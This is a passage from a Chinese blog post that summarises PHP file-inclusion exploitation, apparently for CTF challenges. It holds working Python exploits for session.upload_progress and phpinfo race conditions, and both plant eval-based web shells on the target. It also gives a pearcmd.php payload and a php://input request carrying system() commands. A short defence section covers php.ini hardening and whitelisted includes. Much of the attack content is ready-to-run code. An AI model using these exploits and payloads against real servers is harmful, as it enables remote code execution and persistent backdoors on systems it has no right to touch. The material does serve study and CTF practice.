<span class="token variable">$content</span><span class="token operator">=</span><span class="token operator">?</span><span class="token operator">></span>php_value<span class="token operator">%</span><span class="token number">20</span>auto_prepend_file<span class="token operator">%</span><span class="token number">20</span>G<span class="token punctuation">:</span>\s1mple<span class="token operator">.</span>php
    
首先来解释<span class="token variable">$filename</span>的代码，这里引用了<span class="token keyword type-declaration">string</span><span class="token operator">.</span>strip_tags过滤器，可以过滤<span class="token operator">.</span>htaccess内容的html标签，自然也就消除了死亡代码；<span class="token variable">$content</span>即闭合死亡代码使其完全消除，并且写入自定义包含文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜  flag.php flag   &#x2F;flag  &#x2F;flag.php  等等；另外还有个很大的问题是，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器</p>
</blockquote>
<hr>
<h1 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h1><blockquote>
<p>php中唯一能无后缀控制，通过向session传入恶意代码并访问其文件实现</p>
</blockquote>
<h2 id="session工作流程"><a href="#session工作流程" class="headerlink" title="session工作流程"></a>session工作流程</h2><blockquote>
<p><code>Session</code>一般称为“会话控制“，简单来说就是是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制</p>
</blockquote>
<ol>
<li>首先使用<code>session_start()</code>函数进行初始化</li>
<li>当执行PHP脚本时，通过使用<strong>SESSION超全局变量</strong>注册session变量即<code>$_SESSION</code></li>
<li>当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的<code>session.savepath</code>指定，下次浏览网页时可以加载使用</li>
</ol>
<ul>
<li><p><strong>session_start()</strong></p>
<p>（1）读取名为<strong>PHPSESSID</strong>（如果没有改变默认值）的cookie值，假使为abc123。</p>
<p>（2）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以在php.ini中设置）读取<code>SESSabc123</code>（默认是这种命名方式）文件，将字符装入SESSION变量中；</p>
<p>（3）若没有读取到PHPSESSID这个COOKIE，也会创建SESSION超全局变量注册session变量。同时创建一个 sess_abc123 (名称为随机值)的session文件，同时将abc123作为PHPSESSID的cookie值返回给浏览器端。</p>
</li>
</ul>
<p><img src="/blog/2023/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20240422194656765.png" alt="image-20240422194656765"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><code>$_SESSION[&quot;username&quot;]=参数</code></p>
<p>当Session文件的内容可控，并且可以获取Session文件的路径，就可以通过包含Session文件进行攻击</p>
<p>Session的存储位置获取：</p>
<ol>
<li>通过phpinfo的信息可以获取到Session的存储位置。phpinfo中的<strong>session.save_path</strong>存储的是Session的存放位置</li>
<li>通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在<code>/var/lib/php/session</code>目录下</li>
</ol>
<h2 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120300273?ops_request_misc=&request_id=&biz_id=102&utm_term=session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-120300273.nonecase&spm=1018.2226.3001.4187">session.upload_progress</a></h2><p>条件：<code>Session Support: enable</code></p>
<blockquote>
<p>当我们将<code>session.upload_progress.enabled</code>的值设置为<strong>on</strong>时，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传进度等)存储在session当中。</p>
</blockquote>
<ul>
<li><p><strong>session.auto_start</strong>：如果 <code>session.auto_start=On </code>，则PHP在接收请求的时候会自动初始化 Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
<p>但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为 off。此时用户是可以自己定义 Session ID 的。</p>
<p>比如，我们在 Cookie 里设置 PHPSESSID&#x3D;a ，PHP 将会在服务器上创建一个文件：<code>/tmp/sess_a</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值由<code>ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name</code>值组成，最后被写入 sess_ 文件里。</p>
</li>
<li><p><strong>session.save_path</strong>：负责 session 文件的存放位置，后面文件包含的时候需要知道恶意文件的位置，如果没有配置则不会生成session文件</p>
</li>
<li><p><strong>session.upload_progress_enabled</strong>：当这个配置为 On 时，代表 <strong>session.upload_progress 功能开启</strong>，如果这个选项关闭，则这个方法用不了</p>
</li>
<li><p><strong>session.upload_progress_cleanup</strong>：这个选项默认也是 On，也就是说<strong>当文件上传结束时，session 文件中有关上传进度的信息立马就会被删除掉</strong>；这里就给我们的操作造成了很大的困难，我们就只能使用<strong>条件竞争</strong>的方式不停的发包，争取在它被删除掉之前就成功利用</p>
</li>
<li><p><strong>session.upload_progress_name</strong>：session中的键值，当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控</p>
</li>
<li><p><strong>session.upload_progress_prefix</strong>：可以设置上传文件内容的前缀，与session.upload_progress_name 将表示为 session 中的键名</p>
</li>
</ul>
<h2 id="session条件竞争"><a href="#session条件竞争" class="headerlink" title="session条件竞争"></a>session条件竞争</h2><blockquote>
<p>by <a target="_blank" rel="noopener" href="https://ph0ebus.github.io/post/[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021]EasyCleanup.html">ph0ebus</a></p>
</blockquote>
<ul>
<li><p>目标环境开启了<code>session.upload_progress.enable</code>选项</p>
</li>
<li><p>发送一个文件上传请求，其中包含一个文件表单和一个名字是PHP_SESSION_UPLOAD_PROGRESS的字段</p>
</li>
<li><p>请求的Cookie中包含Session ID</p>
</li>
<li><p>注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传。</p>
</li>
</ul>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> io
<span class="token keyword">import</span> threading

url <span class="token operator">=</span> <span class="token string">'http://6f7113f0-473f-406d-90a6-0cdbbdfacb48.challenge.ctf.show/'</span>    <span class="token comment"># 改成自己的url</span>
sessionid <span class="token operator">=</span> <span class="token string">'truthahn'</span>      <span class="token comment"># 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn</span>
cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessionid
        <span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>		<span class="token comment"># write()函数用于写入session临时文件</span>
    fileBytes <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment"># 设置上传文件的大小为50k</span>
    data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?=eval($_POST[1])?>'</span>    <span class="token comment"># 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?> 实现一句话</span>
    <span class="token punctuation">&#125;</span>
    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'truthahn.jpg'</span><span class="token punctuation">,</span>fileBytes<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    
        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>
        <span class="token comment"># print(res.text)</span>
        <span class="token comment">#print('======= write done! ======')</span>

<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span> 		<span class="token comment"># read()函数利用session临时文件生成一句话木马，实现rce</span>
    data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"1"</span><span class="token punctuation">:</span><span class="token string">"file_put_contents('/var/www/html/3.php','&lt;?=eval($_POST[2]);?>');"</span>     <span class="token comment"># 使用file_put_contents()php内置函数生成名为3.php的shell文件</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?file=/tmp/sess_'</span><span class="token operator">+</span>sessionid<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
        <span class="token comment"># print(res.text)</span>
        res2 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'3.php'</span><span class="token punctuation">)</span>
        <span class="token comment"># print(res2.text)</span>
        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>     <span class="token comment">#若3.php成功生成，则返回Done!，否则返回失败的状态码</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'++++++++ Done! +++++++++'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>       
    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>     <span class="token comment"># 为每个函数设置5个线程并发执行</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment">#print('*'*50)</span>
            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment">#print('='*50)</span>
            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h1 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h1><p>见的比较少，本质是使用<strong>PHP伪协议</strong>获取远程内容进行包含</p>
<p>由此可以远程包含自己服务器上的一句话木马并执行</p>
<p>无限制：参数之后加上危险脚本的URL，一般把如一句话木马的php脚本放在自己的vps上进行远程包含</p>
<p>有限制时截断：</p>
<ul>
<li>使用<code>?</code>绕过，<strong>问号之后的字符串会被当做查询参数丢弃</strong></li>
<li>使用<code>%20</code>绕过</li>
</ul>
<p>伪协议php:&#x2F;&#x2F;input控制输出流：（BurpSuite）</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/file_include/index.php?jumpTo=php://input</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
......
<span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span>

&lt;?php system("ipconfig/all"); ?>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时把显示主机IP地址信息的命令“输入”到了PHP中</p>
<hr>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul>
<li><p><strong>调整php.ini中的不合理配置</strong></p>
<ul>
<li><strong>magic_quotes_gpc&#x3D;On</strong>，将参数中的异常字符进行转义。</li>
<li><strong>allow_url_include&#x3D;Off</strong>，禁止将URL作为文件打开处理。</li>
<li><strong>allow_url_fopen&#x3D;Off</strong>，禁止<code>include()</code>和<code>require()</code>打开URL作为文件处理</li>
</ul>
</li>
<li><p><strong>过滤异常字符</strong></p>
<p>检查参数，如果参数中含有<code>%</code>，<code>#</code>，<code>;</code>等不需要的字符，将其去掉或者拒绝请求</p>
</li>
<li><p>更改Apache日志路径：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyt2008/article/details/8282310">https://blog.csdn.net/wuyt2008/article/details/8282310</a></p>
</li>
<li><p><strong>写死包含的路径或文件名</strong></p>
</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$link</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jumpTo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	  <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		  <span class="token keyword">case</span> <span class="token string single-quoted-string">'job'</span><span class="token punctuation">:</span>
			  <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./jobs.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			  <span class="token keyword">break</span><span class="token punctuation">;</span>
		  <span class="token keyword">case</span> <span class="token string single-quoted-string">'hobby'</span><span class="token punctuation">:</span>
			  <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./hobby.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			  <span class="token keyword">break</span><span class="token punctuation">;</span>
		  <span class="token keyword">default</span><span class="token punctuation">:</span>
			  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"风雪的缩影，如琉璃般飘落......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			  <span class="token keyword">break</span><span class="token punctuation">;</span>
	  <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">// Do nothing.    </span>
  <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>王小美の主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>个人主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./img/ganyu.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Name: 甘雨<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Age: 3000+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>我是女生<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./index.php?jumpTo=job<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>我的工作<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./index.php?jumpTo=hobby<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>我的兴趣爱好<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<hr>
<h1 id="Pearcmd"><a href="#Pearcmd" class="headerlink" title="Pearcmd"></a>Pearcmd</h1><p>条件：</p>
<ul>
<li>register_argc_argv&#x3D;On</li>
<li>在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装；docker镜像默认安装</li>
</ul>
<p><a href="/blog/2023/07/25/LFI%E5%8C%85%E5%90%ABpearcmd-php%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">LFI包含pearcmd.php进行命令执行</a></p>
<p>payload：通常是GET请求才能达成利用</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd'])?>+/tmp/test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h1 id="Docker-PHP裸文件本地包含"><a href="#Docker-PHP裸文件本地包含" class="headerlink" title="Docker PHP裸文件本地包含"></a>Docker PHP裸文件本地包含</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p>
<h2 id="phpinfo-amp-条件竞争法"><a href="#phpinfo-amp-条件竞争法" class="headerlink" title="phpinfo&amp;条件竞争法"></a>phpinfo&amp;条件竞争法</h2><p>条件：</p>
<ul>
<li>include</li>
<li>已知php临时上传文件的路径名（如 phpinfo 页面可获取 <code>$_FILES</code> 变量值来得到临时路径）</li>
</ul>
<p>exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> socket

<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    TAG <span class="token operator">=</span> <span class="token string">"Security Test"</span>
    PAYLOAD <span class="token operator">=</span> <span class="token triple-quoted-string string">"""%s\r
&lt;?php file_put_contents('/tmp/gg', '&lt;?=eval($_REQUEST[1])?>')?>\r"""</span> <span class="token operator">%</span> TAG
    REQ1_DATA <span class="token operator">=</span> <span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r"""</span> <span class="token operator">%</span> PAYLOAD
    padding <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">5000</span>
    REQ1 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""POST /?p="""</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
HTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
HTTP_USER_AGENT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
HTTP_ACCEPT_LANGUAGE: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
HTTP_PRAGMA: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s"""</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> REQ1_DATA<span class="token punctuation">)</span>
    <span class="token comment"># modify this to suit the LFI script   </span>
    LFIREQ <span class="token operator">=</span> <span class="token triple-quoted-string string">"""GET /?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    

    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> <span class="token string">b""</span>
    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>
        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">b"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>
        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
